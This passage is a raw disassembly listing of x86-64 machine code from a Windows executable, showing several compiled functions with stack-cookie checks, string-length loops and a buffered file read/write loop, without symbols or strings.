   1400042e3:	cc                   	int3
   1400042e4:	cc                   	int3
   1400042e5:	cc                   	int3
   1400042e6:	cc                   	int3
   1400042e7:	cc                   	int3
   1400042e8:	cc                   	int3
   1400042e9:	cc                   	int3
   1400042ea:	cc                   	int3
   1400042eb:	cc                   	int3
   1400042ec:	cc                   	int3
   1400042ed:	cc                   	int3
   1400042ee:	cc                   	int3
   1400042ef:	cc                   	int3
   1400042f0:	40 57                	rex push %rdi
   1400042f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400042f6:	83 3d df cd 03 00 00 	cmpl   $0x0,0x3cddf(%rip)        # 0x1400410dc
   1400042fd:	48 8d 51 78          	lea    0x78(%rcx),%rdx
   140004301:	48 8b f9             	mov    %rcx,%rdi
   140004304:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000430a:	74 34                	je     0x140004340
   14000430c:	48 8d 0d 9d 39 03 00 	lea    0x3399d(%rip),%rcx        # 0x140037cb0
   140004313:	e8 88 17 00 00       	call   0x140005aa0
   140004318:	48 85 c0             	test   %rax,%rax
   14000431b:	75 15                	jne    0x140004332
   14000431d:	48 8d 0d 0c f3 01 00 	lea    0x1f30c(%rip),%rcx        # 0x140023630
   140004324:	e8 57 da ff ff       	call   0x140001d80
   140004329:	83 c8 ff             	or     $0xffffffff,%eax
   14000432c:	48 83 c4 20          	add    $0x20,%rsp
   140004330:	5f                   	pop    %rdi
   140004331:	c3                   	ret
   140004332:	48 8d 0d 77 39 03 00 	lea    0x33977(%rip),%rcx        # 0x140037cb0
   140004339:	e8 d2 f7 ff ff       	call   0x140003b10
   14000433e:	eb 1e                	jmp    0x14000435e
   140004340:	48 8d 0d 99 89 03 00 	lea    0x38999(%rip),%rcx        # 0x14003cce0
   140004347:	e8 64 17 00 00       	call   0x140005ab0
   14000434c:	48 85 c0             	test   %rax,%rax
   14000434f:	74 cc                	je     0x14000431d
   140004351:	48 8d 0d 88 89 03 00 	lea    0x38988(%rip),%rcx        # 0x14003cce0
   140004358:	ff 15 1a e8 02 00    	call   *0x2e81a(%rip)        # 0x140032b78
   14000435e:	83 3d 77 cd 03 00 00 	cmpl   $0x0,0x3cd77(%rip)        # 0x1400410dc
   140004365:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000436b:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004370:	48 8d 9f 78 30 00 00 	lea    0x3078(%rdi),%rbx
   140004377:	48 8b d3             	mov    %rbx,%rdx
   14000437a:	74 39                	je     0x1400043b5
   14000437c:	48 8d 0d 1d 29 03 00 	lea    0x3291d(%rip),%rcx        # 0x140036ca0
   140004383:	e8 18 17 00 00       	call   0x140005aa0
   140004388:	48 85 c0             	test   %rax,%rax
   14000438b:	75 1a                	jne    0x1400043a7
   14000438d:	48 8d 0d c4 f2 01 00 	lea    0x1f2c4(%rip),%rcx        # 0x140023658
   140004394:	e8 e7 d9 ff ff       	call   0x140001d80
   140004399:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000439e:	83 c8 ff             	or     $0xffffffff,%eax
   1400043a1:	48 83 c4 20          	add    $0x20,%rsp
   1400043a5:	5f                   	pop    %rdi
   1400043a6:	c3                   	ret
   1400043a7:	48 8d 0d f2 28 03 00 	lea    0x328f2(%rip),%rcx        # 0x140036ca0
   1400043ae:	e8 6d f7 ff ff       	call   0x140003b20
   1400043b3:	eb 38                	jmp    0x1400043ed
   1400043b5:	48 8d 0d 14 69 03 00 	lea    0x36914(%rip),%rcx        # 0x14003acd0
   1400043bc:	e8 ef 16 00 00       	call   0x140005ab0
   1400043c1:	48 85 c0             	test   %rax,%rax
   1400043c4:	75 1a                	jne    0x1400043e0
   1400043c6:	48 8d 0d cb f2 01 00 	lea    0x1f2cb(%rip),%rcx        # 0x140023698
   1400043cd:	e8 ae d9 ff ff       	call   0x140001d80
   1400043d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400043d7:	83 c8 ff             	or     $0xffffffff,%eax
   1400043da:	48 83 c4 20          	add    $0x20,%rsp
   1400043de:	5f                   	pop    %rdi
   1400043df:	c3                   	ret
   1400043e0:	48 8d 0d e9 68 03 00 	lea    0x368e9(%rip),%rcx        # 0x14003acd0
   1400043e7:	ff 15 93 e7 02 00    	call   *0x2e793(%rip)        # 0x140032b80
   1400043ed:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   1400043f1:	83 3d e4 cc 03 00 00 	cmpl   $0x0,0x3cce4(%rip)        # 0x1400410dc
   1400043f8:	74 26                	je     0x140004420
   1400043fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004400:	49 ff c0             	inc    %r8
   140004403:	42 80 3c 03 00       	cmpb   $0x0,(%rbx,%r8,1)
   140004408:	75 f6                	jne    0x140004400
   14000440a:	48 8b d3             	mov    %rbx,%rdx
   14000440d:	48 8d 0d 6c e8 02 00 	lea    0x2e86c(%rip),%rcx        # 0x140032c80
   140004414:	e8 07 a2 00 00       	call   0x14000e620
   140004419:	e9 8b 00 00 00       	jmp    0x1400044a9
   14000441e:	66 90                	xchg   %ax,%ax
   140004420:	49 ff c0             	inc    %r8
   140004423:	42 80 3c 03 00       	cmpb   $0x0,(%rbx,%r8,1)
   140004428:	75 f6                	jne    0x140004420
   14000442a:	48 8b d3             	mov    %rbx,%rdx
   14000442d:	48 8d 0d 4c e8 02 00 	lea    0x2e84c(%rip),%rcx        # 0x140032c80
   140004434:	e8 e7 a1 00 00       	call   0x14000e620
   140004439:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000443f:	48 8d 15 0e e2 01 00 	lea    0x1e20e(%rip),%rdx        # 0x140022654
   140004446:	48 8d 0d 33 e8 02 00 	lea    0x2e833(%rip),%rcx        # 0x140032c80
   14000444d:	e8 ae ab 00 00       	call   0x14000f000
   140004452:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140004458:	48 8d 15 61 f2 01 00 	lea    0x1f261(%rip),%rdx        # 0x1400236c0
   14000445f:	48 8d 0d 1a e8 02 00 	lea    0x2e81a(%rip),%rcx        # 0x140032c80
   140004466:	e8 95 ab 00 00       	call   0x14000f000
   14000446b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004471:	48 8d 15 5c f2 01 00 	lea    0x1f25c(%rip),%rdx        # 0x1400236d4
   140004478:	48 8d 0d 01 e8 02 00 	lea    0x2e801(%rip),%rcx        # 0x140032c80
   14000447f:	e8 7c ab 00 00       	call   0x14000f000
   140004484:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140004488:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000448f:	00 
   140004490:	49 ff c0             	inc    %r8
   140004493:	42 80 3c 03 00       	cmpb   $0x0,(%rbx,%r8,1)
   140004498:	75 f6                	jne    0x140004490
   14000449a:	48 8b d3             	mov    %rbx,%rdx
   14000449d:	48 8d 0d dc e7 02 00 	lea    0x2e7dc(%rip),%rcx        # 0x140032c80
   1400044a4:	e8 57 ab 00 00       	call   0x14000f000
   1400044a9:	83 3d 2c cc 03 00 00 	cmpl   $0x0,0x3cc2c(%rip)        # 0x1400410dc
   1400044b0:	75 4b                	jne    0x1400044fd
   1400044b2:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400044b8:	48 8d 15 c1 e7 02 00 	lea    0x2e7c1(%rip),%rdx        # 0x140032c80
   1400044bf:	48 8d 0d fa 47 03 00 	lea    0x347fa(%rip),%rcx        # 0x140038cc0
   1400044c6:	e8 e5 15 00 00       	call   0x140005ab0
   1400044cb:	48 85 c0             	test   %rax,%rax
   1400044ce:	75 1a                	jne    0x1400044ea
   1400044d0:	48 8d 0d 01 f2 01 00 	lea    0x1f201(%rip),%rcx        # 0x1400236d8
   1400044d7:	e8 a4 d8 ff ff       	call   0x140001d80
   1400044dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044e1:	83 c8 ff             	or     $0xffffffff,%eax
   1400044e4:	48 83 c4 20          	add    $0x20,%rsp
   1400044e8:	5f                   	pop    %rdi
   1400044e9:	c3                   	ret
   1400044ea:	ff 15 a0 e6 02 00    	call   *0x2e6a0(%rip)        # 0x140032b90
   1400044f0:	48 8d 0d c9 47 03 00 	lea    0x347c9(%rip),%rcx        # 0x140038cc0
   1400044f7:	ff 15 8b e6 02 00    	call   *0x2e68b(%rip)        # 0x140032b88
   1400044fd:	48 8b cf             	mov    %rdi,%rcx
   140004500:	e8 db fa ff ff       	call   0x140003fe0
   140004505:	ff 15 4d e6 02 00    	call   *0x2e64d(%rip)        # 0x140032b58
   14000450b:	83 3d ca cb 03 00 00 	cmpl   $0x0,0x3cbca(%rip)        # 0x1400410dc
   140004512:	74 38                	je     0x14000454c
   140004514:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000451a:	48 8d 15 5f e7 02 00 	lea    0x2e75f(%rip),%rdx        # 0x140032c80
   140004521:	48 8d 0d 68 07 03 00 	lea    0x30768(%rip),%rcx        # 0x140034c90
   140004528:	e8 73 15 00 00       	call   0x140005aa0
   14000452d:	48 85 c0             	test   %rax,%rax
   140004530:	75 0c                	jne    0x14000453e
   140004532:	48 8d 0d c7 f1 01 00 	lea    0x1f1c7(%rip),%rcx        # 0x140023700
   140004539:	e8 42 d8 ff ff       	call   0x140001d80
   14000453e:	48 8d 0d 4b 07 03 00 	lea    0x3074b(%rip),%rcx        # 0x140034c90
   140004545:	e8 b6 f5 ff ff       	call   0x140003b00
   14000454a:	eb 0d                	jmp    0x140004559
   14000454c:	48 8d 0d 6d 47 03 00 	lea    0x3476d(%rip),%rcx        # 0x140038cc0
   140004553:	ff 15 3f e6 02 00    	call   *0x2e63f(%rip)        # 0x140032b98
   140004559:	48 8b cf             	mov    %rdi,%rcx
   14000455c:	e8 9f fc ff ff       	call   0x140004200
   140004561:	85 c0                	test   %eax,%eax
   140004563:	75 17                	jne    0x14000457c
   140004565:	ff 15 ad e6 02 00    	call   *0x2e6ad(%rip)        # 0x140032c18
   14000456b:	48 85 c0             	test   %rax,%rax
   14000456e:	74 1a                	je     0x14000458a
   140004570:	48 8d 0d c9 f1 01 00 	lea    0x1f1c9(%rip),%rcx        # 0x140023740
   140004577:	e8 04 d8 ff ff       	call   0x140001d80
   14000457c:	83 c8 ff             	or     $0xffffffff,%eax
   14000457f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004584:	48 83 c4 20          	add    $0x20,%rsp
   140004588:	5f                   	pop    %rdi
   140004589:	c3                   	ret
   14000458a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000458f:	48 83 c4 20          	add    $0x20,%rsp
   140004593:	5f                   	pop    %rdi
   140004594:	c3                   	ret
   140004595:	cc                   	int3
   140004596:	cc                   	int3
   140004597:	cc                   	int3
   140004598:	cc                   	int3
   140004599:	cc                   	int3
   14000459a:	cc                   	int3
   14000459b:	cc                   	int3
   14000459c:	cc                   	int3
   14000459d:	cc                   	int3
   14000459e:	cc                   	int3
   14000459f:	cc                   	int3
   1400045a0:	40 53                	rex push %rbx
   1400045a2:	56                   	push   %rsi
   1400045a3:	57                   	push   %rdi
   1400045a4:	b8 30 10 00 00       	mov    $0x1030,%eax
   1400045a9:	e8 a2 46 00 00       	call   0x140008c50
   1400045ae:	48 2b e0             	sub    %rax,%rsp
   1400045b1:	48 8b 05 58 da 02 00 	mov    0x2da58(%rip),%rax        # 0x140032010
   1400045b8:	48 33 c4             	xor    %rsp,%rax
   1400045bb:	48 89 84 24 20 10 00 	mov    %rax,0x1020(%rsp)
   1400045c2:	00 
   1400045c3:	48 8b da             	mov    %rdx,%rbx
   1400045c6:	49 8b f8             	mov    %r8,%rdi
   1400045c9:	48 8d 15 30 de 01 00 	lea    0x1de30(%rip),%rdx        # 0x140022400
   1400045d0:	e8 fb e7 ff ff       	call   0x140002dd0
   1400045d5:	48 8b d7             	mov    %rdi,%rdx
   1400045d8:	48 8b cb             	mov    %rbx,%rcx
   1400045db:	48 8b f0             	mov    %rax,%rsi
   1400045de:	e8 2d 04 00 00       	call   0x140004a10
   1400045e3:	33 ff                	xor    %edi,%edi
   1400045e5:	48 8b d8             	mov    %rax,%rbx
   1400045e8:	48 85 f6             	test   %rsi,%rsi
   1400045eb:	0f 84 a3 00 00 00    	je     0x140004694
   1400045f1:	48 8b ce             	mov    %rsi,%rcx
   1400045f4:	48 85 c0             	test   %rax,%rax
   1400045f7:	0f 84 9f 00 00 00    	je     0x14000469c
   1400045fd:	e8 ca 68 00 00       	call   0x14000aecc
   140004602:	85 c0                	test   %eax,%eax
   140004604:	75 7a                	jne    0x140004680
   140004606:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000460d:	00 00 00 
   140004610:	4c 8b ce             	mov    %rsi,%r9
   140004613:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004618:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000461d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004623:	e8 7c 6b 00 00       	call   0x14000b1a4
   140004628:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000462c:	75 11                	jne    0x14000463f
   14000462e:	48 8b ce             	mov    %rsi,%rcx
   140004631:	e8 c2 68 00 00       	call   0x14000aef8
   140004636:	85 c0                	test   %eax,%eax
   140004638:	74 2d                	je     0x140004667
   14000463a:	48 8b ce             	mov    %rsi,%rcx
   14000463d:	eb 39                	jmp    0x140004678
   14000463f:	4c 8b cb             	mov    %rbx,%r9
   140004642:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004647:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000464c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004652:	e8 b5 75 00 00       	call   0x14000bc0c
   140004657:	85 c0                	test   %eax,%eax
   140004659:	7e 1a                	jle    0x140004675
   14000465b:	48 8b cb             	mov    %rbx,%rcx
   14000465e:	e8 95 68 00 00       	call   0x14000aef8
   140004663:	85 c0                	test   %eax,%eax
   140004665:	75 0e                	jne    0x140004675
   140004667:	48 8b ce             	mov    %rsi,%rcx
   14000466a:	e8 5d 68 00 00       	call   0x14000aecc
   14000466f:	85 c0                	test   %eax,%eax
   140004671:	74 9d                	je     0x140004610
   140004673:	eb 0b                	jmp    0x140004680
   140004675:	48 8b cb             	mov    %rbx,%rcx
   140004678:	e8 d7 cb 00 00       	call   0x140011254
   14000467d:	83 cf ff             	or     $0xffffffff,%edi
   140004680:	48 8b ce             	mov    %rsi,%rcx
   140004683:	e8 d8 67 00 00       	call   0x14000ae60
   140004688:	48 8b cb             	mov    %rbx,%rcx
   14000468b:	e8 d0 67 00 00       	call   0x14000ae60
   140004690:	8b c7                	mov    %edi,%eax
   140004692:	eb 10                	jmp    0x1400046a4
   140004694:	48 85 db             	test   %rbx,%rbx
   140004697:	74 08                	je     0x1400046a1
   140004699:	48 8b cb             	mov    %rbx,%rcx
   14000469c:	e8 bf 67 00 00       	call   0x14000ae60
   1400046a1:	83 c8 ff             	or     $0xffffffff,%eax
   1400046a4:	48 8b 8c 24 20 10 00 	mov    0x1020(%rsp),%rcx
   1400046ab:	00 
   1400046ac:	48 33 cc             	xor    %rsp,%rcx
   1400046af:	e8 5c 45 00 00       	call   0x140008c10
   1400046b4:	48 81 c4 30 10 00 00 	add    $0x1030,%rsp
   1400046bb:	5f                   	pop    %rdi
   1400046bc:	5e                   	pop    %rsi
   1400046bd:	5b                   	pop    %rbx
   1400046be:	c3                   	ret
   1400046bf:	cc                   	int3
   1400046c0:	40 53                	rex push %rbx
   1400046c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400046c6:	83 b9 78 40 00 00 01 	cmpl   $0x1,0x4078(%rcx)
   1400046cd:	48 8b d9             	mov    %rcx,%rbx
   1400046d0:	74 3e                	je     0x140004710
   1400046d2:	48 8d 15 cf f1 01 00 	lea    0x1f1cf(%rip),%rdx        # 0x1400238a8
   1400046d9:	e8 a2 ce ff ff       	call   0x140001580
   1400046de:	48 8d 8b 78 20 00 00 	lea    0x2078(%rbx),%rcx
   1400046e5:	48 8b d0             	mov    %rax,%rdx
   1400046e8:	e8 33 00 00 00       	call   0x140004720
   1400046ed:	85 c0                	test   %eax,%eax
   1400046ef:	75 15                	jne    0x140004706
   1400046f1:	48 8d 0d c8 f1 01 00 	lea    0x1f1c8(%rip),%rcx        # 0x1400238c0
   1400046f8:	e8 83 d6 ff ff       	call   0x140001d80
   1400046fd:	83 c8 ff             	or     $0xffffffff,%eax
   140004700:	48 83 c4 20          	add    $0x20,%rsp
   140004704:	5b                   	pop    %rbx
   140004705:	c3                   	ret
   140004706:	c7 83 78 40 00 00 01 	movl   $0x1,0x4078(%rbx)
   14000470d:	00 00 00 
   140004710:	33 c0                	xor    %eax,%eax
   140004712:	48 83 c4 20          	add    $0x20,%rsp
   140004716:	5b                   	pop    %rbx
   140004717:	c3                   	ret
   140004718:	cc                   	int3
   140004719:	cc                   	int3
   14000471a:	cc                   	int3
   14000471b:	cc                   	int3
   14000471c:	cc                   	int3
   14000471d:	cc                   	int3
   14000471e:	cc                   	int3
   14000471f:	cc                   	int3
   140004720:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004725:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000472a:	56                   	push   %rsi
   14000472b:	57                   	push   %rdi
   14000472c:	41 56                	push   %r14
   14000472e:	b8 70 30 00 00       	mov    $0x3070,%eax
   140004733:	e8 18 45 00 00       	call   0x140008c50
   140004738:	48 2b e0             	sub    %rax,%rsp
   14000473b:	48 8b 05 ce d8 02 00 	mov    0x2d8ce(%rip),%rax        # 0x140032010
   140004742:	48 33 c4             	xor    %rsp,%rax
   140004745:	48 89 84 24 60 30 00 	mov    %rax,0x3060(%rsp)
   14000474c:	00 
   14000474d:	48 8b ea             	mov    %rdx,%rbp
   140004750:	4c 8b f1             	mov    %rcx,%r14
   140004753:	48 85 d2             	test   %rdx,%rdx
   140004756:	74 64                	je     0x1400047bc
   140004758:	48 8d 0d 31 f1 01 00 	lea    0x1f131(%rip),%rcx        # 0x140023890
   14000475f:	e8 fc 01 00 00       	call   0x140004960
   140004764:	4c 8b c5             	mov    %rbp,%r8
   140004767:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000476c:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004771:	48 8b f0             	mov    %rax,%rsi
   140004774:	e8 c7 e6 ff ff       	call   0x140002e40
   140004779:	45 33 c0             	xor    %r8d,%r8d
   14000477c:	48 8d 15 0d f1 01 00 	lea    0x1f10d(%rip),%rdx        # 0x140023890
   140004783:	33 c9                	xor    %ecx,%ecx
   140004785:	e8 26 13 00 00       	call   0x140005ab0
   14000478a:	45 33 c0             	xor    %r8d,%r8d
   14000478d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004792:	33 c9                	xor    %ecx,%ecx
   140004794:	48 8b f8             	mov    %rax,%rdi
   140004797:	e8 14 13 00 00       	call   0x140005ab0
   14000479c:	48 8b d0             	mov    %rax,%rdx
   14000479f:	48 8b cf             	mov    %rdi,%rcx
   1400047a2:	48 8b d8             	mov    %rax,%rbx
   1400047a5:	e8 ea b7 00 00       	call   0x14000ff94
   1400047aa:	48 8b cf             	mov    %rdi,%rcx
   1400047ad:	e8 1a 66 00 00       	call   0x14000adcc
   1400047b2:	48 8b cb             	mov    %rbx,%rcx
   1400047b5:	e8 12 66 00 00       	call   0x14000adcc
   1400047ba:	eb 05                	jmp    0x1400047c1
   1400047bc:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   1400047c1:	48 8d 94 24 60 10 00 	lea    0x1060(%rsp),%rdx
   1400047c8:	00 
   1400047c9:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400047ce:	ff 15 84 d8 01 00    	call   *0x1d884(%rip)        # 0x140022058
   1400047d4:	e8 ab 9f 00 00       	call   0x14000e784
   1400047d9:	44 8b c8             	mov    %eax,%r9d
   1400047dc:	4c 8d 05 b5 f0 01 00 	lea    0x1f0b5(%rip),%r8        # 0x140023898
   1400047e3:	ba 10 00 00 00       	mov    $0x10,%edx
   1400047e8:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400047ed:	e8 4e 0b 00 00       	call   0x140005340
   1400047f2:	33 db                	xor    %ebx,%ebx
   1400047f4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400047f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400047ff:	00 
   140004800:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140004805:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   14000480c:	00 
   14000480d:	e8 26 ca 00 00       	call   0x140011238
   140004812:	48 8b c8             	mov    %rax,%rcx
   140004815:	48 8b f8             	mov    %rax,%rdi
   140004818:	e8 b3 10 00 00       	call   0x1400058d0
   14000481d:	85 c0                	test   %eax,%eax
   14000481f:	0f 84 84 00 00 00    	je     0x1400048a9
   140004825:	48 8b cf             	mov    %rdi,%rcx
   140004828:	e8 9f 65 00 00       	call   0x14000adcc
   14000482d:	ff c3                	inc    %ebx
   14000482f:	83 fb 05             	cmp    $0x5,%ebx
   140004832:	7c cc                	jl     0x140004800
   140004834:	48 85 ed             	test   %rbp,%rbp
   140004837:	74 69                	je     0x1400048a2
   140004839:	45 33 c0             	xor    %r8d,%r8d
   14000483c:	48 8d 15 4d f0 01 00 	lea    0x1f04d(%rip),%rdx        # 0x140023890
   140004843:	33 c9                	xor    %ecx,%ecx
   140004845:	e8 66 12 00 00       	call   0x140005ab0
   14000484a:	48 85 f6             	test   %rsi,%rsi
   14000484d:	74 3d                	je     0x14000488c
   14000484f:	45 33 c0             	xor    %r8d,%r8d
   140004852:	48 8b d6             	mov    %rsi,%rdx
   140004855:	33 c9                	xor    %ecx,%ecx
   140004857:	48 8b f8             	mov    %rax,%rdi
   14000485a:	e8 51 12 00 00       	call   0x140005ab0
   14000485f:	48 8b d0             	mov    %rax,%rdx
   140004862:	48 8b cf             	mov    %rdi,%rcx
   140004865:	48 8b d8             	mov    %rax,%rbx
   140004868:	e8 27 b7 00 00       	call   0x14000ff94
   14000486d:	48 8b cf             	mov    %rdi,%rcx
   140004870:	e8 57 65 00 00       	call   0x14000adcc
   140004875:	48 8b cb             	mov    %rbx,%rcx
   140004878:	e8 4f 65 00 00       	call   0x14000adcc
   14000487d:	48 8b ce             	mov    %rsi,%rcx
   140004880:	e8 47 65 00 00       	call   0x14000adcc
   140004885:	33 c0                	xor    %eax,%eax
   140004887:	e9 9f 00 00 00       	jmp    0x14000492b
   14000488c:	33 d2                	xor    %edx,%edx
   14000488e:	48 8b c8             	mov    %rax,%rcx
   140004891:	48 8b d8             	mov    %rax,%rbx
   140004894:	ff 15 ae d7 01 00    	call   *0x1d7ae(%rip)        # 0x140022048
   14000489a:	48 8b cb             	mov    %rbx,%rcx
   14000489d:	e8 2a 65 00 00       	call   0x14000adcc
   1400048a2:	33 c0                	xor    %eax,%eax
   1400048a4:	e9 82 00 00 00       	jmp    0x14000492b
   1400048a9:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400048af:	48 8b d7             	mov    %rdi,%rdx
   1400048b2:	49 8b ce             	mov    %r14,%rcx
   1400048b5:	e8 d6 12 00 00       	call   0x140005b90
   1400048ba:	48 8b cf             	mov    %rdi,%rcx
   1400048bd:	e8 0a 65 00 00       	call   0x14000adcc
   1400048c2:	48 85 ed             	test   %rbp,%rbp
   1400048c5:	74 5f                	je     0x140004926
   1400048c7:	45 33 c0             	xor    %r8d,%r8d
   1400048ca:	48 8d 15 bf ef 01 00 	lea    0x1efbf(%rip),%rdx        # 0x140023890
   1400048d1:	33 c9                	xor    %ecx,%ecx
   1400048d3:	e8 d8 11 00 00       	call   0x140005ab0
   1400048d8:	48 85 f6             	test   %rsi,%rsi
   1400048db:	74 33                	je     0x140004910
   1400048dd:	45 33 c0             	xor    %r8d,%r8d
   1400048e0:	48 8b d6             	mov    %rsi,%rdx
   1400048e3:	33 c9                	xor    %ecx,%ecx
   1400048e5:	48 8b f8             	mov    %rax,%rdi
   1400048e8:	e8 c3 11 00 00       	call   0x140005ab0
   1400048ed:	48 8b d0             	mov    %rax,%rdx
   1400048f0:	48 8b cf             	mov    %rdi,%rcx
   1400048f3:	48 8b d8             	mov    %rax,%rbx
   1400048f6:	e8 99 b6 00 00       	call   0x14000ff94
   1400048fb:	48 8b cf             	mov    %rdi,%rcx
   1400048fe:	e8 c9 64 00 00       	call   0x14000adcc
   140004903:	48 8b cb             	mov    %rbx,%rcx
   140004906:	e8 c1 64 00 00       	call   0x14000adcc
   14000490b:	48 8b ce             	mov    %rsi,%rcx
   14000490e:	eb 11                	jmp    0x140004921
   140004910:	33 d2                	xor    %edx,%edx
   140004912:	48 8b c8             	mov    %rax,%rcx
   140004915:	48 8b d8             	mov    %rax,%rbx
   140004918:	ff 15 2a d7 01 00    	call   *0x1d72a(%rip)        # 0x140022048
   14000491e:	48 8b cb             	mov    %rbx,%rcx
   140004921:	e8 a6 64 00 00       	call   0x14000adcc
   140004926:	b8 01 00 00 00       	mov    $0x1,%eax
   14000492b:	48 8b 8c 24 60 30 00 	mov    0x3060(%rsp),%rcx
   140004932:	00 
   140004933:	48 33 cc             	xor    %rsp,%rcx
   140004936:	e8 d5 42 00 00       	call   0x140008c10
   14000493b:	4c 8d 9c 24 70 30 00 	lea    0x3070(%rsp),%r11
   140004942:	00 
   140004943:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004947:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   14000494b:	49 8b e3             	mov    %r11,%rsp
   14000494e:	41 5e                	pop    %r14
   140004950:	5f                   	pop    %rdi
   140004951:	5e                   	pop    %rsi
   140004952:	c3                   	ret
   140004953:	cc                   	int3
   140004954:	cc                   	int3
   140004955:	cc                   	int3
   140004956:	cc                   	int3
   140004957:	cc                   	int3
   140004958:	cc                   	int3
   140004959:	cc                   	int3
   14000495a:	cc                   	int3
   14000495b:	cc                   	int3
   14000495c:	cc                   	int3
   14000495d:	cc                   	int3
   14000495e:	cc                   	int3
   14000495f:	cc                   	int3
   140004960:	b8 38 40 00 00       	mov    $0x4038,%eax
   140004965:	e8 e6 42 00 00       	call   0x140008c50
   14000496a:	48 2b e0             	sub    %rax,%rsp
   14000496d:	48 8b 05 9c d6 02 00 	mov    0x2d69c(%rip),%rax        # 0x140032010
   140004974:	48 33 c4             	xor    %rsp,%rax
   140004977:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   14000497e:	00 
   14000497f:	48 8b d1             	mov    %rcx,%rdx
   140004982:	45 33 c0             	xor    %r8d,%r8d
   140004985:	33 c9                	xor    %ecx,%ecx
   140004987:	e8 24 11 00 00       	call   0x140005ab0
   14000498c:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   140004992:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004997:	48 8b c8             	mov    %rax,%rcx
   14000499a:	ff 15 a0 d6 01 00    	call   *0x1d6a0(%rip)        # 0x140022040
   1400049a0:	85 c0                	test   %eax,%eax
   1400049a2:	74 52                	je     0x1400049f6
   1400049a4:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   1400049aa:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   1400049b1:	00 
   1400049b2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400049b7:	ff 15 93 d6 01 00    	call   *0x1d693(%rip)        # 0x140022050
   1400049bd:	45 33 c0             	xor    %r8d,%r8d
   1400049c0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400049c5:	33 c9                	xor    %ecx,%ecx
   1400049c7:	e8 c4 11 00 00       	call   0x140005b90
   1400049cc:	48 85 c0             	test   %rax,%rax
   1400049cf:	74 25                	je     0x1400049f6
   1400049d1:	80 38 00             	cmpb   $0x0,(%rax)
   1400049d4:	74 20                	je     0x1400049f6
   1400049d6:	48 8b c8             	mov    %rax,%rcx
   1400049d9:	e8 6a ab 00 00       	call   0x14000f548
   1400049de:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400049e5:	00 
   1400049e6:	48 33 cc             	xor    %rsp,%rcx
   1400049e9:	e8 22 42 00 00       	call   0x140008c10
   1400049ee:	48 81 c4 38 40 00 00 	add    $0x4038,%rsp
   1400049f5:	c3                   	ret
   1400049f6:	33 c0                	xor    %eax,%eax
   1400049f8:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400049ff:	00 
   140004a00:	48 33 cc             	xor    %rsp,%rcx
   140004a03:	e8 08 42 00 00       	call   0x140008c10
   140004a08:	48 81 c4 38 40 00 00 	add    $0x4038,%rsp
   140004a0f:	c3                   	ret
   140004a10:	40 53                	rex push %rbx
   140004a12:	b8 60 40 00 00       	mov    $0x4060,%eax
   140004a17:	e8 34 42 00 00       	call   0x140008c50
   140004a1c:	48 2b e0             	sub    %rax,%rsp
   140004a1f:	48 8b 05 ea d5 02 00 	mov    0x2d5ea(%rip),%rax        # 0x140032010
   140004a26:	48 33 c4             	xor    %rsp,%rax
   140004a29:	48 89 84 24 50 40 00 	mov    %rax,0x4050(%rsp)
   140004a30:	00 
   140004a31:	48 8b da             	mov    %rdx,%rbx
   140004a34:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004a3a:	48 8b d1             	mov    %rcx,%rdx
   140004a3d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004a42:	e8 d9 9b 00 00       	call   0x14000e620
   140004a47:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
